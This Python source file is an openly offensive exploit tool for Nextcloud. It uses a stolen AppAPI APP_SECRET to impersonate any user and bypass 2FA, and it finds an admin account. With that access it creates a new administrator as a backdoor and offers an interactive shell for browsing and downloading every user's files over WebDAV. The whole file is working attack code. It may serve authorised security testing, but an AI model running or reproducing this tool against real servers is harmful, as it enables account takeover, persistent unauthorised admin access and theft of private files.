#!/usr/bin/env python3
"""
Nextcloud AppAPI Exploitation Tool

Generic tool for Nextcloud takeover via APP_SECRET.
Works with any ExApp - just provide the credentials.

Author: Chocapikk
Date: 2026-01-17
"""

import argparse
import base64
import re
import secrets
import shlex
import string
import sys
from urllib.parse import urljoin, unquote

import requests
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import Completer, Completion
from prompt_toolkit.formatted_text import HTML

from windfall import log, console

BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║              N C   A P P A P I   E X P L O I T                ║
║              Nextcloud Takeover via APP_SECRET                ║
║                                                               ║
║              Impersonate Any User · Bypass 2FA                ║
║                        by Chocapikk                           ║
╚═══════════════════════════════════════════════════════════════╝
"""


class NCAppAPI:
    """Nextcloud AppAPI exploitation - generic, no leak dependency."""
    
    def __init__(self, nc_url: str, app_secret: str, app_id: str = "flow",
                 aa_version: str | None = None, app_version: str = "x", timeout: int = 30):
        self.nc_url = nc_url.rstrip("/")
        self.app_secret = app_secret
        self.app_id = app_id
        self.aa_version = aa_version  # Optional - not validated by Nextcloud
        self.app_version = app_version  # Required but not validated (just non-empty)
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self._users_cache: dict[str, list[str]] | None = None
        self._admin_user: str | None = None
    
    def _auth_header(self, user_id: str = "") -> str:
        """Generate AUTHORIZATION-APP-API header."""
        return base64.b64encode(f"{user_id}:{self.app_secret}".encode()).decode()
    
    def _ocs(self, method: str, endpoint: str, **kwargs):
        """Make OCS API request with minimal required headers."""
        headers = kwargs.pop("headers", {})
        # Minimum required AppAPI headers (from source analysis):
        # - EX-APP-ID: validated (must be registered ExApp)
        # - AUTHORIZATION-APP-API: validated (secret must match)
        # - EX-APP-VERSION: required non-empty, but value NOT validated
        # - AA-VERSION: NOT required for auth
        # - OCS-APIRequest: required for non-AppAPI endpoints (CSRF bypass)
        headers.update({
            "AUTHORIZATION-APP-API": self._auth_header(kwargs.pop("user_id", "")),
            "EX-APP-ID": self.app_id,
            "EX-APP-VERSION": self.app_version,
            "OCS-APIRequest": "true",  # Required for /cloud/* endpoints
        })
        if self.aa_version:
            headers["AA-VERSION"] = self.aa_version
        kwargs["headers"] = headers
        kwargs.setdefault("timeout", self.timeout)
        url = urljoin(self.nc_url + "/", endpoint.lstrip("/"))
        try:
            return self.session.request(method, url, **kwargs)
        except Exception as e:
            log.info(f"OCS error: {e}")
            return None
    
    def _ocs_ok(self, r) -> bool:
        """Check if OCS response is OK."""
        return r and r.ok and "<status>ok</status>" in r.text
    
    def _fetch_users_details(self) -> bool:
        """Fetch users and find an admin. Optimized to minimize requests."""
        if self._users_cache is not None:
            return True
        
        p = log.progress("Fetching users")
        
        # 1. Get user list (requires no userid - AppAPI endpoint)
        r = self._ocs("GET", "/ocs/v1.php/apps/app_api/api/v1/users")
        if not r or "<status>ok</status>" not in r.text:
            p.failure("Failed to list users")
            return False
        
        users = re.findall(r'<element>([^<]+)</element>', r.text)
        if not users:
            p.failure("No users found")
            return False
        
        self._users_cache = {u: [] for u in users}  # Init all users with empty groups
        
        # 2. Try bulk endpoint first (1 request for all details)
        r = self._ocs("GET", "/ocs/v2.php/cloud/users/details", user_id=users[0])
        if r and "<enabled>" in r.text:
            for user_match in re.finditer(r'<([^>]+)>\s*<enabled>', r.text):
                user_id = user_match.group(1)
                user_block = re.search(
                    rf'<{re.escape(user_id)}>.*?<groups>(.*?)</groups>.*?</{re.escape(user_id)}>',
                    r.text, re.DOTALL
                )
                if user_block:
                    groups = re.findall(r'<element>([^<]+)</element>', user_block.group(1))
                    self._users_cache[user_id] = groups
                    if "admin" in groups and not self._admin_user:
                        self._admin_user = user_id
        
        # 3. Fallback: individual requests, but stop once we find an admin
        if not self._admin_user:
            for user_id in users:
                if self._users_cache.get(user_id):  # Already have groups from bulk
                    continue
                r = self._ocs("GET", f"/ocs/v1.php/cloud/users/{user_id}", user_id=user_id)
                if r and "<groups>" in r.text:
                    groups_match = re.search(r'<groups>(.*?)</groups>', r.text, re.DOTALL)
                    groups = re.findall(r'<element>([^<]+)</element>', groups_match.group(1)) if groups_match else []
                    self._users_cache[user_id] = groups
                    if "admin" in groups:
                        self._admin_user = user_id
                        break  # Found admin, stop querying
        
        p.success(f"{len(self._users_cache)} users, admin: {self._admin_user or 'none'}")
        return True
    
    def list_users(self) -> list[str]:
        """List Nextcloud users."""
        if not self._fetch_users_details():
            return []
        return list(self._users_cache.keys())
    
    def get_admin_user(self) -> str | None:
        """Get an admin user for impersonation."""
        if not self._fetch_users_details():
            return None
        return self._admin_user
    
    def _admin_action(self, label: str, endpoint: str, data: dict) -> bool:
        """Execute an admin action with impersonation."""
        p = log.progress(label)
        admin = self.get_admin_user()
        if not admin:
            p.failure("No admin to impersonate")
            return False
        r = self._ocs("POST", endpoint, data=data, user_id=admin)
        if self._ocs_ok(r):
            p.success("OK")
            return True
        msg = re.search(r'<message>([^<]+)</message>', r.text) if r else None
        p.failure(msg.group(1) if msg else "Failed")
        return False
    
    def create_user(self, user_id: str, password: str) -> bool:
        """Create Nextcloud user."""
        return self._admin_action(
            f"Creating user: {user_id}",
            "/ocs/v2.php/cloud/users",
            {"userid": user_id, "password": password}
        )
    
    def make_admin(self, user_id: str) -> bool:
        """Add user to admin group."""
        return self._admin_action(
            "Adding to admin group",
            f"/ocs/v2.php/cloud/users/{user_id}/groups",
            {"groupid": "admin"}
        )
    
    def verify_login(self, user_id: str, password: str) -> bool:
        """Verify login via WebDAV."""
        p = log.progress("Verifying login")
        try:
            r = self.session.request(
                "PROPFIND", f"{self.nc_url}/remote.php/dav/files/{user_id}/",
                auth=(user_id, password), headers={"Depth": "0"}, timeout=self.timeout
            )
            if r.status_code in (200, 207):
                p.success("OK")
                return True
            p.failure(f"HTTP {r.status_code}")
        except:
            p.failure("Failed")
        return False
    
    def _dav(self, method: str, user_id: str, path: str = "/", **kwargs):
        """Make WebDAV request as user via AppAPI impersonation."""
        headers = kwargs.pop("headers", {})
        headers.update({
            "AUTHORIZATION-APP-API": self._auth_header(user_id),
            "EX-APP-ID": self.app_id,
            "EX-APP-VERSION": self.app_version,
        })
        if self.aa_version:
            headers["AA-VERSION"] = self.aa_version
        kwargs["headers"] = headers
        kwargs.setdefault("timeout", self.timeout)
        url = f"{self.nc_url}/remote.php/dav/files/{user_id}/{path.lstrip('/')}"
        try:
            return self.session.request(method, url, **kwargs)
        except Exception as e:
            log.info(f"DAV error: {e}")
            return None
    
    def list_files(self, user_id: str, path: str = "/", depth: int = 1) -> tuple[list[dict], str | None]:
        """List files for a user via WebDAV impersonation. Returns (files, error)."""
        r = self._dav("PROPFIND", user_id, path, headers={"Depth": str(depth)})
        if not r:
            return [], "Connection error"
        if r.status_code == 404:
            return [], "Not found"
        if r.status_code in (401, 403):
            return [], "Access denied"
        if r.status_code not in (200, 207):
            return [], f"HTTP {r.status_code}"
        
        norm_path = path.strip("/")
        files = []
        for href in re.findall(r'<d:href>([^<]+)</d:href>', r.text):
            match = re.search(rf'/remote\.php/dav/files/{re.escape(user_id)}/(.*)$', href)
            fpath = match.group(1) if match else href
            if not fpath:
                continue
            if unquote(fpath).strip("/") == norm_path:
                continue
            is_dir = f'<d:href>{href}</d:href>' in r.text and '<d:collection/>' in r.text.split(f'<d:href>{href}</d:href>')[1].split('</d:response>')[0]
            files.append({"path": fpath, "is_dir": is_dir})
        return files, None
    
    def download_file(self, user_id: str, path: str) -> bytes | None:
        """Download file as user via WebDAV impersonation."""
        r = self._dav("GET", user_id, path)
        if r and r.ok:
            return r.content
        return None
    
    def create_admin(self, user_id: str = None, password: str = None) -> tuple[str, str] | None:
        """Create admin user."""
        user_id = user_id or f"adm_{''.join(secrets.choice(string.ascii_lowercase) for _ in range(5))}"
        password = password or ''.join(secrets.choice(string.ascii_letters + string.digits + "!@#$") for _ in range(20))
        
        if not self.create_user(user_id, password):
            return None
        if not self.make_admin(user_id):
            return None
        self.verify_login(user_id, password)
        return (user_id, password)


class ShellCompleter(Completer):
    """Completer for file shell using shlex for proper quote handling."""
    
    COMMANDS = ["user", "users", "ls", "cd", "pwd", "cat", "get", "help", "exit"]
    
    def __init__(self, shell: "FileShell"):
        self.shell = shell
        self._files_cache: dict[str, list[dict]] = {}
    
    def _get_files(self, path: str) -> list[dict]:
        if not self.shell.user:
            return []
        cache_key = f"{self.shell.user}:{path}"
        if cache_key not in self._files_cache:
            files, _ = self.shell.api.list_files(self.shell.user, path)
            self._files_cache[cache_key] = files
        return self._files_cache[cache_key]
    
    def _parse_line(self, text: str) -> tuple[list[str], str, bool]:
        """Parse command line using shlex.
        
        Returns: (tokens, current_arg, in_quotes)
        """
        lexer = shlex.shlex(text, posix=True)
        lexer.whitespace_split = True
        lexer.commenters = ""
        
        tokens = []
        try:
            tokens = list(lexer)
        except ValueError:
            pass
        
        in_quotes = lexer.state is not None and lexer.state in lexer.quotes
        
        if in_quotes:
            quote_start = max(text.rfind('"'), text.rfind("'"))
            current_arg = text[quote_start + 1:] if quote_start >= 0 else ""
        elif text.endswith(" "):
            current_arg = ""
        elif tokens:
            for i in range(len(text) - 1, -1, -1):
                if text[i] in " \t" and i < len(text) - 1:
                    current_arg = text[i + 1:]
                    break
            else:
                current_arg = text
        else:
            current_arg = text
        
        return tokens, current_arg, in_quotes
    
    def _complete_path(self, partial: str, in_quotes: bool):
        if not self.shell.user:
            return
        
        partial_clean = partial.lstrip('"').lstrip("'")
        
        if "/" in partial_clean:
            base, prefix = partial_clean.rsplit("/", 1)
            path_prefix = base + "/"
        else:
            base = self.shell.cwd
            prefix = partial_clean
            path_prefix = ""
        
        resolved_base = self.shell._resolve(base or "/")
        files = self._get_files(resolved_base)
        
        for f in files:
            name = unquote(f["path"]).rstrip("/").split("/")[-1]
            if name.lower().startswith(prefix.lower()):
                suffix = "/" if f["is_dir"] else ""
                completion = path_prefix + name + suffix
                
                if " " in completion and not in_quotes:
                    completion = shlex.quote(completion)
                
                yield Completion(completion, start_position=-len(partial))
    
    def _complete_user(self, partial: str, in_quotes: bool):
        for u in self.shell.api.list_users():
            if u.lower().startswith(partial.lower()):
                display = shlex.quote(u) if " " in u and not in_quotes else u
                yield Completion(display, start_position=-len(partial))
    
    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        tokens, current_arg, in_quotes = self._parse_line(text)
        
        if not tokens or (len(tokens) == 1 and not text.endswith(" ") and not in_quotes):
            prefix = tokens[0].lower() if tokens else ""
            for cmd in self.COMMANDS:
                if cmd.startswith(prefix):
                    yield Completion(cmd, start_position=-len(prefix))
            return
        
        cmd = tokens[0].lower()
        
        if cmd == "user":
            yield from self._complete_user(current_arg, in_quotes)
        elif cmd in ("ls", "cd", "cat", "get"):
            yield from self._complete_path(current_arg, in_quotes)


class FileShell:
    """Interactive shell for browsing user files."""
    
    def __init__(self, api: NCAppAPI):
        self.api = api
        self.user: str | None = None
        self.cwd = "/"
        self.completer = ShellCompleter(self)
        self.session = PromptSession(completer=self.completer)
    
    def _prompt(self) -> HTML:
        if self.user:
            return HTML(f"<cyan>{self.user}</cyan>:<blue>{self.cwd}</blue>&gt; ")
        return HTML("<yellow>no user</yellow>&gt; ")
    
    def _resolve(self, path: str) -> str:
        """Resolve path relative to cwd, normalizing . and .. components."""
        if path.startswith("/"):
            parts = path.split("/")
        else:
            parts = self.cwd.rstrip("/").split("/") + path.split("/")
        
        result = []
        for p in parts:
            if p == "..":
                if result:
                    result.pop()
            elif p and p != ".":
                result.append(p)
        return "/" + "/".join(result)
    
    def cmd_help(self, _):
        cmds = [
            ("user <name>", "Switch to user"),
            ("users", "List all users"),
            ("ls [path]", "List files"),
            ("cd <path>", "Change directory"),
            ("pwd", "Print working directory"),
            ("cat <file>", "Show file content"),
            ("get <file> [out]", "Download file"),
            ("exit", "Quit"),
        ]
        width = max(len(c) for c, _ in cmds)
        for cmd, desc in cmds:
            print(f"  {cmd:<{width}}  {desc}")
    
    def cmd_users(self, _):
        for u in self.api.list_users():
            groups = self.api._users_cache.get(u, [])
            log.info(f"  {u}" + (" (admin)" if "admin" in groups else ""))
    
    def cmd_user(self, args):
        if not args:
            log.warning("Usage: user <name>")
            return
        self.user = " ".join(args)
        self.cwd = "/"
        self.completer._files_cache.clear()
        log.success(f"Switched to {self.user}")
    
    def cmd_pwd(self, _):
        log.info(self.cwd)
    
    def cmd_ls(self, args):
        if not self.user:
            log.warning("No user selected. Use: user <name>")
            return
        path = self._resolve(" ".join(args)) if args else self.cwd
        files, error = self.api.list_files(self.user, path)
        if error:
            log.warning(error)
            return
        if not files:
            log.info("Empty directory")
            return
        for f in files:
            name = unquote(f["path"]).rstrip("/").split("/")[-1]
            if f["is_dir"]:
                console.print(f"  [bold blue]{name}/[/]")
            else:
                console.print(f"  {name}")
    
    def cmd_cd(self, args):
        if not args:
            self.cwd = "/"
            return
        self.cwd = self._resolve(" ".join(args))
        self.completer._files_cache.clear()
    
    def cmd_get(self, args):
        if not self.user:
            log.warning("No user selected")
            return
        if not args or not args[0].strip():
            log.warning('Usage: get <file> [output]')
            log.info('  Tip: Use quotes for paths with spaces: get "My File.pdf"')
            return
        if len(args) > 2:
            log.warning('Too many arguments. Use quotes for paths with spaces:')
            log.info('  get "My File.pdf" output.pdf')
            return
        
        path = self._resolve(args[0])
        out = args[1] if len(args) == 2 and args[1].strip() else unquote(path.split("/")[-1])
        
        if not out.strip():
            log.warning("Invalid output filename")
            return
        
        data = self.api.download_file(self.user, path)
        if data:
            with open(out, "wb") as f:
                f.write(data)
            log.success(f"{len(data)} bytes → {out}")
        else:
            log.warning(f"Failed to download: {path}")
    
    def cmd_cat(self, args):
        if not self.user:
            log.warning("No user selected")
            return
        if not args:
            log.warning("Usage: cat <file>")
            return
        path = self._resolve(" ".join(args))
        data = self.api.download_file(self.user, path)
        if data:
            try:
                console.print(data.decode())
            except:
                log.warning(f"Binary file ({len(data)} bytes)")
        else:
            log.warning("Failed")
    
    def run(self):
        self.cmd_users(None)
        log.info("Type 'help' for commands, Tab for completion")
        while True:
            try:
                line = self.session.prompt(self._prompt()).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not line:
                continue
            try:
                parts = shlex.split(line)
            except ValueError:
                parts = line.split()
            cmd, args = parts[0].lower(), parts[1:]
            if cmd in ("exit", "quit", "q"):
                break
            handler = getattr(self, f"cmd_{cmd}", None)
            if handler:
                handler(args)
            else:
                log.warning(f"Unknown command: {cmd}")


def main():
    parser = argparse.ArgumentParser(
        description="Nextcloud AppAPI Exploitation Tool",
        epilog="Only --app-secret and --app-id are validated by Nextcloud. "
               "AA-VERSION and EX-APP-VERSION are NOT checked for authentication."
    )
    parser.add_argument("url", help="Nextcloud URL")
    parser.add_argument("--app-secret", required=True, help="APP_SECRET (required, validated)")
    parser.add_argument("--app-id", default="flow", help="EX-APP-ID (required, validated) (default: flow)")
    parser.add_argument("--aa-version", default=None, help="AA-VERSION (NOT required, NOT validated)")
    parser.add_argument("--app-version", default="x", help="EX-APP-VERSION (required non-empty, but NOT validated)")
    parser.add_argument("--list-users", action="store_true", help="List users")
    parser.add_argument("--create-admin", action="store_true", help="Create admin")
    parser.add_argument("-U", "--username", help="Admin username")
    parser.add_argument("-P", "--password", help="Admin password")
    parser.add_argument("--verify", nargs=2, metavar=("USER", "PASS"), help="Verify login")
    parser.add_argument("--shell", action="store_true", help="Interactive file browser")
    args = parser.parse_args()
    
    console.print(BANNER)
    log.info(f"Target: {args.url}")
    aa_info = f", AA_VERSION: {args.aa_version}" if args.aa_version else ""
    log.info(f"APP_ID: {args.app_id}{aa_info}")
    
    api = NCAppAPI(
        nc_url=args.url,
        app_secret=args.app_secret,
        app_id=args.app_id,
        aa_version=args.aa_version,
        app_version=args.app_version
    )
    
    if args.verify:
        sys.exit(0 if api.verify_login(*args.verify) else 1)
    
    if args.create_admin:
        result = api.create_admin(args.username, args.password)
        if not result:
            sys.exit(1)
        user, pwd = result
        log.success(f"Credentials: {user} / {pwd}")
        log.info(f"Login: {api.nc_url}/login")
    elif args.list_users:
        users = api.list_users()
        for u in users:
            groups = api._users_cache.get(u, [])
            log.info(f"  {u}" + (" (admin)" if "admin" in groups else ""))
    elif args.shell:
        FileShell(api).run()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
